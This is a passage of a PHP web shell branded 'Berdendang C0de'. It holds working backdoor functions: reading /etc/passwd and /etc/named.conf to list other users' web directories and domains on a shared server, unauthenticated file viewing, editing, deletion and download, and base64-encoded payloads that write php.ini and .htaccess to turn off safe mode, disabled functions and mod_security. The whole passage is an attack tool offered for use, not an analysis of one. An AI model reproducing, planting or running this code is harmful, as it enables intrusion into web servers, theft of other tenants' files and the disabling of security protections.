							$jrw = "[<font color=lime>RW</font>] <a href='?dir=$web_vh'>$web_vh</a>";
						}
						echo $jrw."<br>";
					}
				}
			}
		if($i == 0) { 
		} else {
			echo '<br>Total ada '.$i.' Kamar di '.gethostbyname($_SERVER['HTTP_HOST']).' ~ BerdendangC0de';
		}
		echo "</pre>";
		} else {
			echo '<center>
				  <form method="post">
				  List Domains: <br>
				  <textarea name="url" style="width: 500px; height: 250px;">';
				  bing('ip:'.gethostbyname($_SERVER['HTTP_HOST']).'');
			echo  '</textarea><br>
				  <input type="submit" value="Jumping" name="jump" style="width: 500px; height: 25px;">
				  </form></center>';
		}
	} else {
		echo "<pre>";
		$etc = fopen("/etc/passwd", "r") or die("<font color=red>Can't read /etc/passwd</font>");
		while($passwd = fgets($etc)) {
			if($passwd == '' || !$etc) {
				echo "<font color=red>Can't read /etc/passwd</font>";
			} else {
				preg_match_all('/(.*?):x:/', $passwd, $user_jumping);
				foreach($user_jumping[1] as $user_idx_jump) {
					$user_jumping_dir = "/home/$user_idx_jump/public_html";
					if(is_readable($user_jumping_dir)) {
						$i++;
						$jrw = "[<font color=lime>R</font>] <a href='?dir=$user_jumping_dir'>$user_jumping_dir</a>";
						if(is_writable($user_jumping_dir)) {
							$jrw = "[<font color=lime>RW</font>] <a href='?dir=$user_jumping_dir'>$user_jumping_dir</a>";
						}
						echo $jrw;
						if(function_exists('posix_getpwuid')) {
							$domain_jump = file_get_contents("/etc/named.conf");	
							if($domain_jump == '') {
								echo " => ( <font color=red>gabisa ambil nama domain nya</font> )<br>";
							} else {
								preg_match_all("#/var/named/(.*?).db#", $domain_jump, $domains_jump);
								foreach($domains_jump[1] as $dj) {
									$user_jumping_url = posix_getpwuid(@fileowner("/etc/valiases/$dj"));
									$user_jumping_url = $user_jumping_url['name'];
									if($user_jumping_url == $user_idx_jump) {
										echo " => ( <u>$dj</u> )<br>";
										break;
									}
								}
							}
						} else {
							echo "<br>";
						}
					}
				}
			}
		}
		if($i == 0) { 
		} else {
			echo '<br>Total ada '.$i.' Kamar di '.gethostbyname($_SERVER['HTTP_HOST']).' ~ BerdendangC0de';
		}
		echo "</pre>";
	}
	echo "</div>";
}
elseif($_GET['act'] == 'newfile') {
	if($_POST['new_save_file']) {
		$newfile = htmlspecialchars($_POST['newfile']);
		$fopen = fopen($newfile, "a+");
		if($fopen) {
			$act = "<script>window.location='?act=edit&dir=".$dir."&file=".$_POST['newfile']."';</script>";
		} else {
			$act = "<font color=red>permission denied</font>";
		}
	}
	echo $act;
	echo "<form method='post'>
	Filename: <input type='text' name='newfile' value='$dir/newfile.php' style='width: 450px;' height='10'>
	<input type='submit' name='new_save_file' value='Submit'>
	</form>";
}
elseif($_GET['act'] == 'newfolder') {
	if($_POST['new_save_folder']) {
		$new_folder = $dir.'/'.htmlspecialchars($_POST['newfolder']);
		if(!mkdir($new_folder)) {
			$act = "<font color=red>permission denied</font>";
		} else {
			$act = "<script>window.location='?dir=".$dir."';</script>";
		}
	}
	echo $act;
	echo "<form method='post'>
	Folder Name: <input type='text' name='newfolder' style='width: 450px;' height='10'>
	<input type='submit' name='new_save_folder' value='Submit'>
	</form>";
} elseif($_GET['act'] == 'rename_dir') {
	if($_POST['dir_rename']) {
		$dir_rename = rename($dir, "".dirname($dir)."/".htmlspecialchars($_POST['fol_rename'])."");
		if($dir_rename) {
			$act = "<script>window.location='?dir=".dirname($dir)."';</script>";
		} else {
			$act = "<font color=red>permission denied</font>";
		}
	echo "".$act."<br>";
	}
	echo "<form method='post'>
	<input type='text' value='".basename($dir)."' name='fol_rename' style='width: 450px;' height='10'>
	<input type='submit' name='dir_rename' value='rename'>
	</form>";
} elseif($_GET['act'] == 'delete_dir') {
	$delete_dir = rmdir($dir);
	if($delete_dir) {
		$act = "<script>window.location='?dir=".dirname($dir)."';</script>";
	} else {
		$act = "<font color=red>could not remove ".basename($dir)."</font>";
	}
	echo $act;
} elseif($_GET['act'] == 'view') {
	echo "Filename: <font color=red>".basename($_GET['file'])."</font> [ <a href='?act=view&dir=$dir&file=".$_GET['file']."'><b>view</b></a> ] [ <a href='?act=edit&dir=$dir&file=".$_GET['file']."'>edit</a> ] [ <a href='?act=rename&dir=$dir&file=".$_GET['file']."'>rename</a> ] [ <a href='?act=download&dir=$dir&file=".$_GET['file']."'>download</a> ] [ <a href='?act=delete&dir=$dir&file=".$_GET['file']."'>delete</a> ]<br>";
	echo "<textarea readonly>".htmlspecialchars(@file_get_contents($_GET['file']))."</textarea>";
} elseif($_GET['act'] == 'edit') {
	if($_POST['save']) {
		$save = file_put_contents($_GET['file'], $_POST['src']);
		if($save) {
			$act = "<font color=red>Saved!</font>";
		} else {
			$act = "<font color=red>permission denied</font>";
		}
	echo "".$act."<br>";
	}
	echo "Filename: <font color=red>".basename($_GET['file'])."</font> [ <a href='?act=view&dir=$dir&file=".$_GET['file']."'>view</a> ] [ <a href='?act=edit&dir=$dir&file=".$_GET['file']."'><b>edit</b></a> ] [ <a href='?act=rename&dir=$dir&file=".$_GET['file']."'>rename</a> ] [ <a href='?act=download&dir=$dir&file=".$_GET['file']."'>download</a> ] [ <a href='?act=delete&dir=$dir&file=".$_GET['file']."'>delete</a> ]<br>";
	echo "<form method='post'>
	<textarea name='src'>".htmlspecialchars(@file_get_contents($_GET['file']))."</textarea><br>
	<input type='submit' value='Save' name='save' style='width: 500px;'>
	</form>";
} elseif($_GET['act'] == 'rename') {
	if($_POST['do_rename']) {
		$rename = rename($_GET['file'], "$dir/".htmlspecialchars($_POST['rename'])."");
		if($rename) {
			$act = "<script>window.location='?dir=".$dir."';</script>";
		} else {
			$act = "<font color=red>permission denied</font>";
		}
	echo "".$act."<br>";
	}
	echo "Filename: <font color=red>".basename($_GET['file'])."</font> [ <a href='?act=view&dir=$dir&file=".$_GET['file']."'>view</a> ] [ <a href='?act=edit&dir=$dir&file=".$_GET['file']."'>edit</a> ] [ <a href='?act=rename&dir=$dir&file=".$_GET['file']."'><b>rename</b></a> ] [ <a href='?act=download&dir=$dir&file=".$_GET['file']."'>download</a> ] [ <a href='?act=delete&dir=$dir&file=".$_GET['file']."'>delete</a> ]<br>";
	echo "<form method='post'>
	<input type='text' value='".basename($_GET['file'])."' name='rename' style='width: 450px;' height='10'>
	<input type='submit' name='do_rename' value='rename'>
	</form>";
} elseif($_GET['act'] == 'delete') {
	$delete = unlink($_GET['file']);
	if($delete) {
		$act = "<script>window.location='?dir=".$dir."';</script>";
	} else {
		$act = "<font color=red>permission denied</font>";
	}
	echo $act;
} elseif(isset($_GET['file']) && ($_GET['file'] != '') && ($_GET['act'] == 'download')) {
	@ob_clean();
	$file = $_GET['file'];
	@header('Content-Description: File Transfer');
	@header('Content-Type: application/octet-stream');
	@header('Content-Disposition: attachment; filename="'.basename($file).'"');
	@header('Expires: 0');
	@header('Cache-Control: must-revalidate');
	@header('Pragma: public');
	@header('Content-Length: ' . filesize($file));
	readfile($file);
	exit;
} else {
	if(is_dir($dir) === true) {
		if(!is_readable($dir)) {
			echo "<font color=red>can't open directory. ( not readable )</font>";
		} else {
			echo '<table width="100%" border="0" cellpadding="3" cellspacing="1" align="center" style="font-size:13px;">
			<tr>
			<th><center>Name</center></th>
			<th><center>Type</center></th>
			<th><center>Size</center></th>
			<th><center>Last Modified</center></th>
			<th><center>Owner/Group</center></th>
			<th><center>Permission</center></th>
			<th><center>Action</center></th>
			</tr>';
			$scandir = scandir($dir);
			$itung=0;
			foreach($scandir as $dirx) {
				$dtype = filetype("$dir/$dirx");
				$dtime = date("F d Y g:i:s", filemtime("$dir/$dirx"));
				if(function_exists('posix_getpwuid')) {
					$downer = @posix_getpwuid(fileowner("$dir/$dirx"));
					$downer = $downer['name'];
				} else {
					//$downer = $uid;
					$downer = fileowner("$dir/$dirx");
				}
				if(function_exists('posix_getgrgid')) {
					$dgrp = @posix_getgrgid(filegroup("$dir/$dirx"));
					$dgrp = $dgrp['name'];
				} else {
					$dgrp = filegroup("$dir/$dirx");
				}
 				if(!is_dir("$dir/$dirx")) continue;
 				if($dirx === '..') {
 					$href = "<a href='?dir=".dirname($dir)."'>$dirx</a>";
 				} elseif($dirx === '.') {
 					$href = "<a href='?dir=$dir'>$dirx</a>";
 				} else {
 					$itung++;
 					$href = "<a id='$itung' href='?dir=$dir/$dirx'>$dirx</a>";
 				}
 				if($dirx === '.' || $dirx === '..') {
 					$act_dir = "<a href='?act=newfile&dir=$dir'>newfile</a> | <a href='?act=newfolder&dir=$dir'>newfolder</a>";
 					} else {
 					$act_dir = "<a href='?act=rename_dir&dir=$dir/$dirx'>rename</a> | <a href='?act=delete_dir&dir=$dir/$dirx'>delete</a>";
 				}
 				echo "<tr>";
 				echo "<td>$href</td>";
				echo "<td><center>$dtype</center></td>";
				echo "<td><center>-</center></th></td>";
				echo "<td><center>$dtime</center></td>";
				echo "<td><center>$downer/$dgrp</center></td>";
				echo "<td><center>".w("$dir/$dirx",perms("$dir/$dirx"))."</center></td>";
				echo "<td style='padding-left: 15px;'>$act_dir</td>";
				echo "</tr>";
			}
		}
	} else {
		echo "<font color=red>can't open directory.</font>";
	}
		$itungfile=0;
		foreach($scandir as $file) {
			$ftype = filetype("$dir/$file");
			$ftime = date("F d Y g:i:s", filemtime("$dir/$file"));
			$size = filesize("$dir/$file")/1024;
			$size = round($size,3);
			if(function_exists('posix_getpwuid')) {
				$fowner = @posix_getpwuid(fileowner("$dir/$file"));
				$fowner = $fowner['name'];
			} else {
				//$downer = $uid;
				$fowner = fileowner("$dir/$file");
			}
			if(function_exists('posix_getgrgid')) {
				$fgrp = @posix_getgrgid(filegroup("$dir/$file"));
				$fgrp = $fgrp['name'];
			} else {
				$fgrp = filegroup("$dir/$file");
			}
			if($size > 1024) {
				$size = round($size/1024,2). 'MB';
			} else {
				$size = $size. 'KB';
			}
			if(!is_file("$dir/$file")) continue;
			$itungfile++;
			echo "<tr>";
			echo "<td><a href='?act=view&dir=$dir&file=$dir/$file'>$file</a></td>";
			echo "<td><center>$ftype</center></td>";
			echo "<td><center>$size</center></td>";
			echo "<td><center>$ftime</center></td>";
			echo "<td><center>$fowner/$fgrp</center></td>";
			echo "<td><center>".w("$dir/$file",perms("$dir/$file"))."</center></td>";
			echo "<td style='padding-left: 15px;'><a href='?act=edit&dir=$dir&file=$dir/$file'>edit</a> | <a href='?act=rename&dir=$dir&file=$dir/$file'>rename</a> | <a href='?act=delete&dir=$dir&file=$dir/$file'>delete</a> | <a idfile='$itungfile' href='?act=download&dir=$dir&file=$dir/$file'>download</a></td>";
			echo "</tr>";
		}
		echo "</table>";
		if(!is_readable($dir)) {
			//
		}
}
#############################
// Batas - Berdendang C0de
#############################
$phpini = 'c2FmZV9tb2RlID0gT0ZGCmRpc2FibGVfZnVuY3Rpb25zID0gTk9ORQ==';
$bysafe = 'PElmTW9kdWxlIG1vZF9zZWN1cml0eS5jPgogICBTZWNGaWx0ZXJFbmdpbmUgT2ZmCiAgIFNlY0ZpbHRlclNjYW5QT1NUIE9mZgo8L0lmTW9kdWxlPg==';
echo '<br /><form method=post><input type="submit" name="bypastod" value="Bypass Safe Mode & Disable Func"/></form>';
if($_POST['bypastod']){
	$ntot = fopen('php.ini', w);
	fwrite($ntot, base64_decode($phpini));
	fclose($ntot);
	$ntot2 = fopen('.htaccess', w);
	fwrite($ntot2, base64_decode($bysafe));
	fclose($ntot2);
}
echo '<center><br /><font color=red><b>Berdendang C0de</b></font></center>';
?>
